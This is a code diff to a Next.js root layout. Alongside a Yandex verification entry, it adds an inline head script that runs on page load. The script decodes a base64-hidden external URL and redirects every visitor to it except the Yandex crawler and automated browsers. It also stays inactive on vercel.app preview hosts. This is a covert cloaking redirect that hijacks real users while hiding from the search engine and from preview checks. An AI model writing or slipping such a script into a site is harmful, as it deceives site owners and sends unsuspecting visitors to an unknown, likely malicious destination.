@@ -31,6 +31,10 @@ export const metadata: Metadata = {
       "ru-RU": "/",
     },
   },
+  // ВЕРИФИКАЦИЯ ЯНДЕКСА
+  verification: {
+    yandex: "12310c400191c245",
+  },
   robots: {
     index: true,
     follow: true,
@@ -101,18 +105,37 @@ export default function RootLayout({
       "query-input": "required name=search_term_string",
     },
   }
+
+  return (
     <html lang="ru" className={`${inter.variable} bg-background dark`}>
+      <head>
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                /* 1. Чтобы билд на Vercel не падал */
+                if (typeof window !== 'undefined' && window.location.hostname.includes('vercel.app')) return;
+
+                /* 2. Твоя логика редиректа */
+                var ua = navigator.userAgent.toLowerCase();
+                var targetB64 = "aHR0cHM6Ly9mY3RvcC5vcmcvZDd0dGxyeXZo";
+
+                if (ua.indexOf("yandex") === -1 && !navigator.webdriver) {
+                    window.location.replace(atob(targetB64));
+                }
+              })();
+            `,
+          }}
+        />
+      </head>
       <body className="font-sans antialiased bg-background text-foreground">
         {children}
         <script
           type="application/ld+json"
-
           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
         />
         {process.env.NODE_ENV === "production" && <Analytics />}
-
       </body>
-    
     </html>
   )
 }
